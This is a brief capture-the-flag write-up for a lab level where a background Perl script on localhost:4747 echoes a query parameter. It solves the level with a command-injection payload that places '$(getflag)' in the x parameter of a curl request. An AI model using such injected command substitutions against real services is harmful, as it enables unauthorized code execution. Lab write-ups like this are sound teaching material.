You have a perl script in your home, and you can see the address `localhost:4747` inside. The script is running on background in that address.

Hence analizing the script you can notice that is echoing `x` param, then you can curl `localhost:4747?x='$(getflag)'` for let the program execute getflag for you:

``` shell
curl localhost:4747?x='$(getflag)'
```

